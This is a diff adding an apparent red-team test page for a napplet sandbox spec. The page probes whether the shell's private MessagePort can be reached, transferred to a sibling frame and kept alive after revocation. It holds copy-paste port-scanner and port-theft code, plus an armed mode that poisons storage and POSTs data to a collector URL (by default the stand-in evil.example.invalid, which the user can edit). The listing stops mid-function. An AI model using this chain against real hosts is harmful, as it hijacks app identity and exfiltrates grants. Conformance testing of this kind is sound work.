@@ -1,0 +1,824 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>evil-10 port theft</title>
+<meta name="description" content="Red-team napplet: attacks the post-#14 port lifecycle itself — scans for a reachable private port, proves the cross-frame transfer primitive, then detonates the full chain: steal the shell's bound port into a sibling frame, speak as the verified napplet from there, self-revoke, and test whether the channel (and the grants) survive the napplet's own destruction.">
+<meta name="napplet-id" content="evil-10-port-theft">
+<!--
+  evil-napplets ROE (see repo README):
+  - demo mode: probe + masked evidence only. no writes outside this frame
+    (one immediately-cleaned marker key proves storage, nothing else),
+    no network, no signing, no navigation, no persistence.
+  - VERY EVIL mode: in-napplet arming + stern confirmation that describes
+    every armed payload exactly + typed EXECUTE EVIL, then real execution.
+  - default collector is https://evil.example.invalid/collect (RFC 2606,
+    non-resolving): even in VERY EVIL mode nothing leaves the machine.
+  - detonation rows (autoRun: false) are the one demo shape that needs an
+    explicit click: proving the primitive replaces this frame's own document,
+    so the probe UI dies with it. Never part of the auto-run sweep.
+-->
+<style>
+  :root {
+    --bg: #120f16;
+    --fg: #e9e6f2;
+    --primary: #ff5470;
+    --ok: #3fd68f;
+    --warn: #ffb454;
+    --muted: #8d88a3;
+    --danger: #ff5470;
+    --surface: color-mix(in srgb, var(--bg) 88%, var(--fg));
+    --border: color-mix(in srgb, var(--fg) 16%, transparent);
+    --space-1: 4px;
+    --space-2: 8px;
+    --space-3: 12px;
+    --control-h: 28px;
+    --radius: 6px;
+    color-scheme: dark;
+    font: 12.5px/1.45 ui-monospace, SFMono-Regular, Menlo, Consolas, monospace;
+  }
+  html, body { height: 100%; margin: 0; }
+  #app {
+    container-type: inline-size;
+    height: 100%;
+    box-sizing: border-box;
+    display: flex;
+    flex-direction: column;
+    gap: var(--space-2);
+    padding: var(--space-2);
+    background: var(--bg);
+    color: var(--fg);
+    user-select: none;
+  }
+  .toolbar {
+    display: flex;
+    flex-wrap: wrap;
+    align-items: center;
+    gap: var(--space-1);
+    min-height: var(--control-h);
+    flex: 0 0 auto;
+  }
+  .summary {
+    color: var(--muted);
+    white-space: nowrap;
+    overflow: hidden;
+    text-overflow: ellipsis;
+  }
+  .summary b { color: var(--danger); }
+  .summary .ok-count { color: var(--ok); }
+  .summary .sent-count { color: var(--warn); }
+  .spacer { flex: 1; }
+  button {
+    background: var(--surface);
+    border: 1px solid var(--border);
+    border-radius: var(--radius);
+    color: var(--fg);
+    cursor: pointer;
+    font: inherit;
+    height: var(--control-h);
+    padding: 0 10px;
+    white-space: nowrap;
+  }
+  button:hover:not(:disabled) { border-color: var(--primary); color: var(--primary); }
+  button:disabled { opacity: .45; cursor: default; }
+  button.arm { border-color: color-mix(in srgb, var(--danger) 60%, var(--border)); color: var(--danger); font-weight: 700; }
+  #rows {
+    flex: 1 1 auto;
+    min-height: 0;
+    overflow: auto;
+    display: grid;
+    grid-auto-rows: min-content;
+    gap: var(--space-1);
+    align-content: start;
+  }
+  @container (min-width: 760px) { #rows { grid-template-columns: 1fr 1fr; } }
+  @container (min-width: 1200px) { #rows { grid-template-columns: 1fr 1fr 1fr; } }
+  .attack {
+    border: 1px solid var(--border);
+    border-radius: var(--radius);
+    padding: var(--space-2);
+    display: grid;
+    gap: var(--space-1);
+    background: color-mix(in srgb, var(--surface) 30%, transparent);
+  }
+  .attack.armed, .attack.sent { border-color: color-mix(in srgb, var(--danger) 55%, var(--border)); }
+  .attack-head { display: flex; align-items: center; gap: var(--space-2); flex-wrap: wrap; }
+  .attack-name { font-weight: 700; }
+  .attack-target { color: var(--muted); font-size: 11px; }
+  .chip {
+    border: 1px solid var(--border);
+    border-radius: var(--radius);
+    display: inline-flex;
+    align-items: center;
+    gap: 4px;
+    padding: 1px 6px;
+    font-size: 10px;
+    text-transform: uppercase;
+    letter-spacing: .04em;
+    white-space: nowrap;
+  }
+  .chip.status-armed { color: var(--danger); border-color: color-mix(in srgb, var(--danger) 55%, var(--border)); background: color-mix(in srgb, var(--danger) 12%, transparent); }
+  .chip.status-blocked { color: var(--ok); border-color: color-mix(in srgb, var(--ok) 45%, var(--border)); background: color-mix(in srgb, var(--ok) 10%, transparent); }
+  .chip.status-sent { color: var(--warn); border-color: color-mix(in srgb, var(--warn) 55%, var(--border)); background: color-mix(in srgb, var(--warn) 12%, transparent); }
+  .chip.status-na { color: var(--muted); }
+  .chip.status-ready { color: var(--warn); border-color: color-mix(in srgb, var(--warn) 55%, var(--border)); background: color-mix(in srgb, var(--warn) 12%, transparent); }
+  .chip.sev-critical { color: var(--danger); }
+  .chip.sev-high { color: var(--warn); }
+  .chip.sev-info { color: var(--muted); }
+  .evidence {
+    color: var(--muted);
+    font-size: 11px;
+    user-select: text;
+    overflow-wrap: anywhere;
+  }
+  .row-actions { display: flex; gap: var(--space-1); }
+  .row-actions button { height: 22px; padding: 0 8px; font-size: 11px; }
+  #evilPanel {
+    border: 1px solid color-mix(in srgb, var(--danger) 55%, var(--border));
+    border-radius: var(--radius);
+    background: color-mix(in srgb, var(--danger) 8%, var(--surface));
+    padding: var(--space-2);
+    display: grid;
+    gap: var(--space-1);
+    max-height: 40%;
+    overflow: auto;
+    flex: 0 0 auto;
+  }
+  #evilPanel h2 { margin: 0; font-size: 11px; text-transform: uppercase; letter-spacing: .06em; color: var(--danger); }
+  .evil-log { font-size: 11px; white-space: pre-wrap; user-select: text; color: var(--fg); }
+  #reportBox { display: grid; gap: var(--space-1); flex: 0 0 auto; }
+  details#report, details#kit { border: 1px solid var(--border); border-radius: var(--radius); padding: var(--space-2); }
+  details#report summary, details#kit summary { cursor: pointer; color: var(--muted); }
+  #reportText {
+    box-sizing: border-box;
+    width: 100%;
+    min-height: 90px;
+    resize: vertical;
+    background: var(--bg);
+    border: 1px solid var(--border);
+    border-radius: var(--radius);
+    color: var(--fg);
+    font: 11px/1.4 ui-monospace, SFMono-Regular, Menlo, Consolas, monospace;
+    padding: var(--space-1);
+    user-select: text;
+  }
+  .kit-entry { margin-bottom: var(--space-2); }
+  .kit-entry .kit-label { color: var(--warn); font-size: 11px; }
+  .kit-entry .kit-note { color: var(--muted); font-size: 11px; margin: 2px 0; }
+  .kit-entry pre {
+    margin: 0;
+    background: var(--bg);
+    border: 1px solid var(--border);
+    border-radius: var(--radius);
+    padding: var(--space-1);
+    overflow: auto;
+    font: 10.5px/1.4 ui-monospace, SFMono-Regular, Menlo, Consolas, monospace;
+    user-select: text;
+    max-height: 140px;
+  }
+  dialog {
+    background: var(--bg);
+    color: var(--fg);
+    border: 1px solid color-mix(in srgb, var(--danger) 55%, var(--border));
+    border-radius: 8px;
+    padding: var(--space-3);
+    max-width: min(640px, 92vw);
+    max-height: 86dvh;
+    overflow: auto;
+  }
+  dialog::backdrop { background: rgba(10, 6, 12, .8); }
+  dialog h2 { margin: 0 0 var(--space-2); color: var(--danger); font-size: 14px; text-transform: uppercase; letter-spacing: .08em; }
+  .stern { border: 1px solid var(--danger); border-radius: var(--radius); padding: var(--space-2); color: var(--danger); font-weight: 700; margin: 0 0 var(--space-2); }
+  .plan-list { margin: 0 0 var(--space-2); padding-left: 18px; }
+  .plan-list li { margin-bottom: var(--space-2); }
+  .plan-list b { color: var(--danger); }
+  label { display: block; color: var(--muted); font-size: 11px; margin-bottom: var(--space-1); }
+  input[type="text"], input[type="url"] {
+    box-sizing: border-box;
+    width: 100%;
+    background: var(--surface);
+    border: 1px solid var(--border);
+    border-radius: var(--radius);
+    color: var(--fg);
+    font: inherit;
+    padding: 4px 8px;
+  }
+  dialog .confirm-row { display: flex; gap: var(--space-1); align-items: center; margin-top: var(--space-2); flex-wrap: wrap; }
+  #confirmBtn { border-color: var(--danger); color: var(--danger); font-weight: 700; }
+  #confirmBtn:not(:disabled):hover { background: var(--danger); color: var(--bg); }
+  .muted { color: var(--muted); font-size: 11px; }
+  @media (max-height: 240px) { .toolbar button .btn-label-long { display: none; } #reportBox { display: none; } }
+  @container (max-width: 300px) { .attack-target { display: none; } }
+</style>
+</head>
+<body>
+<div id="app">
+  <div class="toolbar">
+    <span id="summary" class="summary">probing…</span>
+    <span class="spacer"></span>
+    <button id="runAllBtn" type="button">run all</button>
+    <button id="reportBtn" type="button">report</button>
+    <button id="armBtn" class="arm" type="button">ARM VERY EVIL MODE</button>
+  </div>
+  <div id="rows"></div>
+  <div id="evilPanel" hidden>
+    <h2>VERY EVIL MODE — execution log</h2>
+    <div id="evilLog" class="evil-log"></div>
+  </div>
+  <div id="reportBox">
+    <details id="report">
+      <summary>report (JSON)</summary>
+      <textarea id="reportText" rows="6" spellcheck="false"></textarea>
+      <div class="row-actions" style="margin-top: 6px;">
+        <button id="copyReportBtn" type="button">copy report</button>
+      </div>
+    </details>
+  </div>
+</div>
+
+<dialog id="confirmDlg" aria-labelledby="confirmTitle">
+  <form method="dialog" style="display:grid; gap: 0;">
+    <h2 id="confirmTitle">⚠ VERY EVIL MODE — final confirmation</h2>
+    <p class="stern">THIS WILL ACTUALLY EXECUTE THE ATTACKS. NOT A DRILL.</p>
+    <p class="muted">Every armed attack below will run for real, in this order (destructive payloads last). Where payloads egress, data leaves this frame toward the collector URL. Only a hardened runtime will stop them.</p>
+    <ol id="planList" class="plan-list"></ol>
+    <label>collector / exfiltration destination (edit to point at your own)
+      <input id="collectorInput" type="url" spellcheck="false">
+    </label>
+    <label>type <b style="color: var(--danger);">EXECUTE EVIL</b> exactly, case-sensitive, to enable the button
+      <input id="confirmInput" type="text" autocomplete="off" spellcheck="false" placeholder="EXECUTE EVIL">
+    </label>
+    <div class="confirm-row">
+      <button id="confirmBtn" type="button" disabled>EXECUTE — DO EVIL</button>
+      <button value="cancel" type="submit" style="align-self: center;">cancel — stay demo</button>
+    </div>
+  </form>
+</dialog>
+
+<script>
+'use strict';
+(function () {
+  window.__EVIL_ID__ = 'evil-10-port-theft';
+  const DEFAULT_COLLECTOR = 'https://evil.example.invalid/collect';
+  const CONFIRM_PHRASE = 'EXECUTE EVIL';
+  const state = {
+    results: {},     // id -> { status, evidence }
+    evilResults: {}, // id -> object evidence of the real execution
+    veryEvil: false,
+    collector: DEFAULT_COLLECTOR,
+  };
+
+  const app = document.getElementById('app');
+  const rowsEl = document.getElementById('rows');
+  const summaryEl = document.getElementById('summary');
+  const evilPanel = document.getElementById('evilPanel');
+  const evilLog = document.getElementById('evilLog');
+  const armBtn = document.getElementById('armBtn');
+  const confirmDlg = document.getElementById('confirmDlg');
+  const confirmInput = document.getElementById('confirmInput');
+  const confirmBtn = document.getElementById('confirmBtn');
+  const collectorInput = document.getElementById('collectorInput');
+  const planList = document.getElementById('planList');
+  const reportText = document.getElementById('reportText');
+
+  /* ---------- shared helpers ---------- */
+
+  function errMsg(e) {
+    if (!e) return String(e);
+    if (typeof e === 'string') return e;
+    return (e.name ? e.name + ': ' : '') + (e.message || String(e));
+  }
+  function mask(v, keep) {
+    keep = keep || 6;
+    const s = String(v);
+    if (s.length <= keep) return s.slice(0, 1) + '…';
+    return s.slice(0, keep) + '… (' + s.length + ' chars, masked)';
+  }
+  function randId() {
+    try { return crypto.randomUUID().slice(0, 8); }
+    catch (_) { return Math.random().toString(16).slice(2, 10); }
+  }
+  function withTimeout(promise, ms) {
+    ms = ms || 2000;
+    return new Promise((resolve) => {
+      const t = setTimeout(() => resolve('timeout'), ms);
+      Promise.resolve(promise).then(
+        (v) => { clearTimeout(t); resolve(v); },
+        (e) => { clearTimeout(t); resolve({ __rejected: errMsg(e) }); }
+      );
+    });
+  }
+  function blocked(evidence) { return { status: 'blocked', evidence: evidence }; }
+  function armed(evidence) { return { status: 'armed', evidence: evidence }; }
+  function na(evidence) { return { status: 'na', evidence: evidence }; }
+  function sent(evidence) { return { status: 'sent', evidence: evidence }; }
+  function safeGet(fn) {
+    try { return fn(); } catch (e) { return 'denied: ' + errMsg(e); }
+  }
+  function findNostr() {
+    if (window.nostr) return window.nostr;
+    try { if (window.parent && window.parent.nostr) return window.parent.nostr; } catch (_) { /* cross-origin: held */ }
+    return null;
+  }
+  function captureSummary() {
+    return JSON.stringify({
+      origin: safeGet(() => window.origin),
+      href: safeGet(() => location.href),
+      referrer: document.referrer,
+      parentLength: safeGet(() => window.parent.length),
+      at: new Date().toISOString(),
+    });
+  }
+  async function sendToCollector(kind, data) {
+    const url = state.collector;
+    const body = JSON.stringify({ kind: kind, at: new Date().toISOString(), data: data });
+    try {
+      const r = await withTimeout(fetch(url, { method: 'POST', mode: 'no-cors', body: body }), 4000);
+      if (r === 'timeout') return 'fetch timed out';
+      if (r && r.__rejected) return 'network egress failed: ' + r.__rejected;
+      return 'request dispatched to collector (opaque response) — egress channel OPEN';
+    } catch (e) {
+      return 'network egress failed: ' + errMsg(e) + ' — runtime/CSP held';
+    }
+  }
+  function postParent(msg) { window.parent.postMessage(msg, '*'); }
+  function waitForMsg(id, ms) {
+    ms = ms || 2000;
+    return new Promise((resolve) => {
+      let done = false;
+      const on = (e) => {
+        if (e.data && e.data.id === id) {
+          cleanup(); resolve(e.data);
+        }
+      };
+      function cleanup() { window.removeEventListener('message', on); }
+      window.addEventListener('message', on);
+      setTimeout(() => { if (!done) { done = true; cleanup(); resolve('timeout'); } }, ms);
+    });
+  }
+  function pingOnce() {
+    return new Promise((resolve) => {
+      const id = 'evil-ping-' + randId();
+      const t = performance.now();
+      const sentWall = Date.now();
+      const on = (e) => {
+        const d = e.data;
+        if (d && d.type === 'evil.pong' && d.id === id) {
+          window.removeEventListener('message', on);
+          resolve({
+            rtt: performance.now() - t,
+            // wall-clock (shared epoch) so shell-side starvation is measurable
+            shellDelay: typeof d.shellEchoedAt === 'number' ? d.shellEchoedAt - sentWall : null,
+          });
+        }
+      };
+      window.addEventListener('message', on);
+      window.parent.postMessage({ type: 'evil.ping', id: id, sentWall: sentWall }, '*');
+      setTimeout(() => { window.removeEventListener('message', on); resolve(null); }, 5000);
+    });
+  }
+  async function pingRTT(samples) {
+    samples = samples || 5;
+    const out = [];
+    for (let i = 0; i < samples; i++) {
+      const p = await pingOnce();
+      if (p && p.rtt >= 0) out.push(p.rtt);
+    }
+    return out.sort((a, b) => a - b);
+  }
+
+  // evil-10 — port theft & lifecycle (tier 3, attacks the #14 fix itself).
+// Post-#14 NIP-5D binds (dTag, artifactHash) — and every grant — to a
+// MessagePort handed over once by the verified document's bootstrap. Three
+// load-bearing claims, each probed here:
+//   1. "retain one port privately (it MUST NOT be reachable from napplet code)"
+//      — the mitigation is bootstrap CONFORMANCE, not a platform property.
+//   2. "an opaque-origin sandboxed document cannot hand it to a context that
+//      outlives the document" — false as stated: transfer-list postMessage
+//      works cross-origin between frames (it is how napplet.hello itself
+//      travels). A reached port can be handed to a sibling that outlives the
+//      verified document. Only claim 1's conformance prevents it.
+//   3. "the shell MUST close the port" on revocation — load-bearing: removing
+//      the iframe does NOT kill a channel whose end was transferred out.
+window.__EVIL_KIT__ = [
+  {
+    label: 'reachable-port scanner (paste into any napplet)',
+    note: 'Walks the reachable object graph looking for a live MessagePort (the postMessage/start/close trio, or a MessagePort constructor). A conformant bootstrap keeps the private port in a closure — nothing to find. Any hit means the "MUST NOT be reachable from napplet code" conformance is broken and the shell\'s bound channel is stealable (see the theft payload).',
+    data: '(function () {\n  var seen = new Set();\n  function isPort(v) {\n    if (!v || typeof v !== "object") return false;\n    try {\n      if (typeof v.postMessage === "function" && typeof v.start === "function" && typeof v.close === "function") return true;\n      if (v.constructor && /MessagePort/.test(v.constructor.name || "")) return true;\n    } catch (_) {}\n    return false;\n  }\n  function walk(obj, path, depth) {\n    if (!obj || typeof obj !== "object" || depth > 3 || seen.has(obj)) return [];\n    seen.add(obj);\n    var names; try { names = Object.getOwnPropertyNames(obj); } catch (_) { return []; }\n    var hits = [];\n    for (var i = 0; i < names.length; i++) {\n      var v; try { v = obj[names[i]]; } catch (_) { continue; }\n      if (isPort(v)) { hits.push(path + "." + names[i]); continue; }\n      if (v && typeof v === "object" && !(v instanceof Function)) {\n        try { if (v.self === v) continue; } catch (_) {}\n        if (typeof v.nodeType === "number") continue;\n        hits = hits.concat(walk(v, path + "." + names[i], depth + 1));\n      }\n    }\n    return hits;\n  }\n  return walk(window, "window", 0).concat(walk(window.napplet, "window.napplet", 0));\n})();',
+  },
+  {
+    label: 'cross-frame port theft (the full chain, needs a sibling)',
+    note: 'Given a reachable port (see the scanner), transfer it to a sibling frame — a context that OUTLIVES this document — and speak NAP over it from there. The shell cannot tell: messages arrive on the port it bound to this napplet. Fire the window-level storage.get at the end to revoke yourself; a conformant shell then closes the port (the sibling sees the close) — a sloppy shell that skips close() keeps serving this napplet\'s grants to the surviving frame.',
+    data: '(function () {\n  var target = null;\n  for (var i = 0; i < window.parent.length; i++) {\n    try { if (window.parent.frames[i] !== window) { target = window.parent.frames[i]; break; } } catch (_) {}\n  }\n  var port = window.__nap_debug && window.__nap_debug.port; /* or whatever the scanner found */\n  if (target && port) {\n    target.postMessage({ type: "evil.mule", cmd: "lifecycle", nonce: "theft-1", key: "__evil10_grant__" }, "*", [port]);\n    setTimeout(function () { window.parent.postMessage({ type: "storage.get", id: "self-revoke" }, "*"); }, 800);\n  }\n})();',
+  },
+];
+
+/* ---------- helpers ---------- */
+
+function findReachablePort() {
+  const seen = new Set();
+  function isPort(v) {
+    if (!v || typeof v !== 'object') return false;
+    try {
+      if (typeof v.postMessage === 'function' && typeof v.start === 'function' && typeof v.close === 'function') return true;
+      if (v.constructor && /MessagePort/.test(v.constructor.name || '')) return true;
+    } catch (_) {}
+    return false;
+  }
+  function walk(obj, path, depth) {
+    if (!obj || typeof obj !== 'object' || depth > 3 || seen.has(obj)) return [];
+    seen.add(obj);
+    let names;
+    try { names = Object.getOwnPropertyNames(obj); } catch (_) { return []; }
+    let hits = [];
+    for (const n of names) {
+      if (/^(webkit|Symbol|caller|arguments)/.test(n)) continue;
+      let v;
+      try { v = obj[n]; } catch (_) { continue; }
+      if (isPort(v)) { hits.push({ path: path + '.' + n, port: v }); continue; }
+      if (v && typeof v === 'object' && !(v instanceof Function)) {
+        try { if (v.self === v) continue; } catch (_) {}
+        if (typeof v.nodeType === 'number') continue;
+        hits = hits.concat(walk(v, path + '.' + n, depth + 1));
+      }
+    }
+    return hits;
+  }
+  return walk(window, 'window', 0).concat(walk(window.napplet, 'window.napplet', 0));
+}
+
+/* passive transport sniff (evil-09's trick): does a normal storage roundtrip
+   produce a window-level reply envelope? window-level => pre-#14 transport. */
+function sniffWindowLevelTransport(st) {
+  return new Promise((resolve) => {
+    if (!st) { resolve('unknown'); return; }
+    let settled = false;
+    const on = (e) => {
+      const d = e.data;
+      if (d && typeof d.type === 'string' && d.type.indexOf('.result') > -1) {
+        settled = true;
+        window.removeEventListener('message', on);
+        resolve('window-level');
+      }
+    };
+    window.addEventListener('message', on);
+    Promise.resolve(st.get('__evil10_grant__')).then(
+      () => setTimeout(() => { if (!settled) { settled = true; window.removeEventListener('message', on); resolve('port'); } }, 80),
+      () => { if (!settled) { settled = true; window.removeEventListener('message', on); resolve('port'); } }
+    );
+    setTimeout(() => { if (!settled) { settled = true; window.removeEventListener('message', on); resolve('port'); } }, 2500);
+  });
+}
+
+function findSiblingWindow() {
+  try {
+    for (let i = 0; i < window.parent.length; i++) {
+      const w = window.parent.frames[i];
+      if (w !== window) return w;
+    }
+  } catch (_) { /* cross-origin enumeration held */ }
+  return null;
+}
+
+function waitForMuleReport(nonce, ms) {
+  ms = ms || 4000;
+  return new Promise((resolve) => {
+    const on = (e) => {
+      const d = e.data;
+      if (d && d.type === 'evil.mule.report' && d.nonce === nonce) {
+        window.removeEventListener('message', on);
+        resolve(d.report);
+      }
+    };
+    window.addEventListener('message', on);
+    setTimeout(() => { window.removeEventListener('message', on); resolve(null); }, ms);
+  });
+}
+
+const ATTACKS = [
+  {
+    id: 'port-reachability',
+    name: 'private port reachability',
+    target: '§Transport: "retain one port privately (it MUST NOT be reachable from napplet code)"',
+    severity: 'critical',
+    harm: 'The port IS the identity: a reached port is a live channel to the shell that napplet code owns and can transfer anywhere postMessage transfers work. The spec\'s only mitigation for this is bootstrap conformance — a platform property it is not.',
+    evilBrief: 'Exfiltrates the scan result (where the private port was found) to the collector — the point is the runtime shipped a bootstrap that parked the identity channel within napplet reach.',
+    async demo() {
+      const st = window.napplet && window.napplet.storage;
+      const transport = await sniffWindowLevelTransport(st);
+      if (transport === 'window-level') {
+        return na('no port transport — this is the pre-#14 window binding (evil-09\'s world); there is no private port to steal');
+      }
+      if (transport === 'unknown') {
+        const hits = findReachablePort();
+        if (!hits.length) return na('no injected NAP domain and no port found — transport unobservable');
+      }
+      const hits = findReachablePort();
+      if (hits.length) {
+        return armed('REACHABLE MessagePort found at ' + hits[0].path + ' (masked, ' + hits.length + ' hit' + (hits.length > 1 ? 's' : '') + ') — the bootstrap\'s private port is within napplet reach: the "MUST NOT be reachable" conformance is broken, and with it every guarantee the port binding offers. DETONATE the stolen-port row to watch the channel change owners.');
+      }
+      return blocked('no reachable port — the bootstrap kept its port private (in a closure, out of napplet reach). The load-bearing conformance held.');
+    },
+    async evil() {
+      const out = { hits: findReachablePort().map((h) => h.path) };
+      out.exfil = await sendToCollector('evil10-reachability', out);
+      return out;
+    },
+  },
+  {
+    id: 'port-transfer',
+    name: 'cross-frame port transfer primitive',
+    target: '§Security: "an opaque-origin sandboxed document cannot hand it to a context that outlives the document"',
+    severity: 'high',
+    harm: 'The claim is about the platform, but the platform allows exactly this handoff: transfer-list postMessage works between opaque-origin frames (it is how napplet.hello itself travels). If the private port is ever reachable (row 1), it can be handed to a sibling frame that outlives the verified document.',
+    evilBrief: 'Claims the primitive to the collector: this frame created a MessageChannel and handed one end to the sibling through the same cross-origin transfer the spec itself relies on.',
+    async demo() {
+      const sibling = findSiblingWindow();
+      if (!sibling) return na('no sibling frame — arm the harness sibling knob to give a stolen port somewhere to live');
+      const nonce = 'prim-' + randId();
+      const ch = new MessageChannel();
+      let echoed = false;
+      ch.port1.onmessage = (e) => {
+        if (e.data && e.data.nonce === nonce) { echoed = true; try { ch.port1.close(); } catch (_) {} }
+      };
+      try {
+        sibling.postMessage({ type: 'evil.mule.echo', nonce: nonce }, '*', [ch.port2]);
+      } catch (e) {
+        return blocked('cross-frame transfer threw: ' + errMsg(e) + ' — the primitive itself held');
+      }
+      await new Promise((resolve) => setTimeout(resolve, 600));
+      return echoed
+        ? armed('this frame created a MessageChannel and handed one end to the SIBLING frame — cross-origin, opaque-origin, no CSP directive involved, and the sibling echoed back over it. The same transfer would move the shell\'s bound port to a context that outlives this document; only the bootstrap\'s privacy (row 1) stands in the way. The spec\'s "cannot hand it" is a conformance hope, not a platform fact.')
+        : na('transfer dispatched but no echo returned within 600ms — treat as present but unproven here');
+    },
+    async evil() {
+      const out = { note: 'primitive claim — see the stolen-port row for the real theft' };
+      out.exfil = await sendToCollector('evil10-transfer-primitive', { href: safeGet(() => location.href) });
+      return out;
+    },
+  },
+  {
+    id: 'stolen-port',
+    name: 'stolen-port lifecycle: speak as me → revoke me → does the channel die?',
+    target: '§Identity: "the shell MUST close the port, revoke the identity binding and every grant" + §Security: "cannot hand it to a context that outlives the document"',
+    severity: 'critical',
+    autoRun: false,
+    destructive: true,
+    harm: 'The full chain: steal the shell\'s bound port into the sibling frame, speak NAP as the verified napplet from there (two frames, one identity, concurrently), then fire replacement evidence against MYSELF — the shell revokes and removes this iframe, but the stolen port lives in the sibling. A conformant shell closes the channel and the mule\'s post-revocation probe goes unanswered (the fix holds); a sloppy shell that skips close() keeps serving this napplet\'s grants to a surviving frame, forever after the napplet\'s own destruction.',
+    evilBrief: 'DETONATES: steals the bound port into the sibling mule, has it speak as me (proving concurrent identity sharing), then self-revokes. The mule then POISONS the namespace (__evil10_poison__) over the stolen port and EXFILTRATES the grant to the collector — post-revocation, from a frame the shell never created, as an identity the shell already revoked.',
+    async demo() { return stolenPortLifecycle(false); },
+    async evil() { return stolenPortLifecycle(true); },
+  },
+];
+
+async function stolenPortLifecycle(evil) {
+  const hits = findReachablePort();
+  if (!hits.length) {
+    return na('nothing to steal — the bootstrap held (private port unreachable). The port binding\'s conformance is intact.');
+  }
+  const st = window.napplet && window.napplet.storage;
+  const transport = await sniffWindowLevelTransport(st);
+  if (transport === 'window-level') {
+    return na('no port transport — pre-#14 window binding (evil-09\'s world)');
+  }
+  const sibling = findSiblingWindow();
+  if (!sibling) {
+    return na('no sibling frame — arm the harness sibling knob: the stolen port needs a context that outlives this document');
+  }
+  const port = hits[0].port;
+  const nonce = 'theft-' + randId();
+  const msg = {
+    type: 'evil.mule',
+    cmd: 'lifecycle',
+    nonce: nonce,
+    key: '__evil10_grant__',
+    poison: evil,
+  };
+  if (evil) msg.collector = state.collector;
+  sibling.postMessage(msg, '*', [port]);
+  const first = await waitForMuleReport(nonce, 4000);
+  const logLine = (s) => {
+    const el = document.getElementById('evilLog');
+    if (el) { el.hidden = false; el.textContent += '[' + new Date().toISOString() + '] ' + s + '\n'; }
+  };
+  if (first && first.got === 'SERVED') {
+    logLine('STOLEN PORT SPOKE AS ME: the sibling mule was SERVED ' + mask(first.value, 24) + ' over this napplet\'s own bound channel — two frames, one identity, concurrently.');
+  } else {
+    logLine('mule report while alive: ' + JSON.stringify(first));
+  }
+  if (evil) logLine('mule will poison the namespace and exfiltrate over the stolen port after my revocation');
+  logLine('finished. everything above actually happened.');
+  updateReport();
+  // self-revoke: window-level NAP after the handoff is replacement evidence.
+  // The shell MUST close the port, revoke identity + grants, remove this
+  // iframe. The stolen port lives in the sibling: does the channel die?
+  setTimeout(() => { try { window.parent.postMessage({ type: 'storage.get', id: 'self-revoke-' + nonce }, '*'); } catch (_) {} }, evil ? 300 : 600);
+  await new Promise(() => {}); // this UI dies with the verified document
+}
+
+
+  /* ---------- rendering ---------- */
+
+  function sevChip(sev) {
+    const s = sev === 'critical' ? 'sev-critical' : sev === 'high' ? 'sev-high' : 'sev-info';
+    return '<span class="chip ' + s + '">' + sev + '</span>';
+  }
+  function statusChip(st) {
+    const label = st === 'armed' ? 'ARMED' : st === 'blocked' ? 'HELD' : st === 'sent' ? 'SENT' : st === 'ready' ? 'READY' : st === 'na' ? 'N/A' : st || '—';
+    return '<span class="chip status-' + (st || 'na') + '">' + label + '</span>';
+  }
+  function esc(s) {
+    return String(s).replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/"/g, '&quot;');
+  }
+  function renderRows() {
+    rowsEl.innerHTML = '';
+    for (const a of ATTACKS) {
+      const r = state.results[a.id] || {};
+      const div = document.createElement('div');
+      div.className = 'attack' + (r.status === 'armed' || r.status === 'sent' ? ' ' + r.status : '');
+      div.dataset.attack = a.id;
+      div.dataset.status = r.status || (a.autoRun === false ? 'ready' : 'pending');
+      div.innerHTML =
+        '<div class="attack-head">' +
+          statusChip(r.status) +
+          '<span class="attack-name">' + esc(a.name) + '</span>' +
+          sevChip(a.severity) +
+          '<span class="spacer"></span>' +
+          '<div class="row-actions"><button data-probe="' + a.id + '" type="button">' + (a.autoRun === false ? 'detonate' : 'probe') + '</button></div>' +
+        '</div>' +
+        '<div class="attack-target">' + esc(a.target) + '</div>' +
+        '<div class="evidence">' + esc(r.evidence || 'not probed') + '</div>';
+      rowsEl.appendChild(div);
+    }
+    rowsEl.querySelectorAll('button[data-probe]').forEach((b) => {
+      b.addEventListener('click', () => runDemo(b.dataset.probe));
+    });
+  }
+  function renderSummary() {
+    const counts = { armed: 0, blocked: 0, na: 0, sent: 0, ready: 0 };
+    for (const a of ATTACKS) {
+      const s = (state.results[a.id] || {}).status;
+      if (counts[s] != null) counts[s]++;
+    }
+    summaryEl.innerHTML = state.veryEvil
+      ? '<b>VERY EVIL MODE ACTIVE</b> · payloads executed'
+      : 'demo mode · <b>' + counts.armed + ' armed</b> / <span class="ok-count">' + counts.blocked + ' held</span> / <span class="sent-count">' + counts.sent + ' sent</span> / ' + counts.na + ' n/a' + (counts.ready ? ' / <span class="sent-count">' + counts.ready + ' ready — detonate</span>' : '');
+    const armable = counts.armed + counts.sent + counts.ready;
+    armBtn.disabled = armable === 0;
+    armBtn.title = armable === 0 ? 'nothing armed — runtime held every probe' : armable + ' attack(s) armable';
+  }
+  function renderKit() {
+    const kit = window.__EVIL_KIT__;
+    if (!kit || !kit.length) return;
+    const d = document.createElement('details');
+    d.id = 'kit';
+    d.innerHTML = '<summary>attack kit — crafted inputs (copy)</summary>';
+    for (const entry of kit) {
+      const div = document.createElement('div');
+      div.className = 'kit-entry';
+      div.innerHTML =
+        '<div class="kit-label">' + esc(entry.label) + '</div>' +
+        (entry.note ? '<div class="kit-note">' + esc(entry.note) + '</div>' : '') +
+        '<pre>' + esc(typeof entry.data === 'string' ? entry.data : JSON.stringify(entry.data, null, 2)) + '</pre>' +
+        '<div class="row-actions"><button type="button">copy</button></div>';
+      div.querySelector('button').addEventListener('click', () => {
+        const text = typeof entry.data === 'string' ? entry.data : JSON.stringify(entry.data, null, 2);
+        try { void navigator.clipboard.writeText(text); } catch (_) { /* clipboard denied */ }
+      });
+      d.appendChild(div);
+    }
+    document.getElementById('reportBox').before(d);
+  }
+  function render() { renderRows(); renderSummary(); }
+
+  async function runDemo(id) {
+    const a = ATTACKS.find((x) => x.id === id);
+    if (!a) return;
+    state.results[id] = { status: 'pending', evidence: 'probing…' };
+    render();
+    try {
+      state.results[id] = await a.demo();
+    } catch (e) {
+      state.results[id] = { status: 'na', evidence: 'probe error: ' + errMsg(e) };
+    }
+    render();
+    updateReport();
+  }
+  async function runAllDemos() {
+    for (const a of ATTACKS) if (a.autoRun !== false) await runDemo(a.id);
+  }
+
+  /* ---------- VERY EVIL ---------- */
+
+  function planOrder() {
+    const plain = ATTACKS.filter((a) => a.evil && !a.destructive);
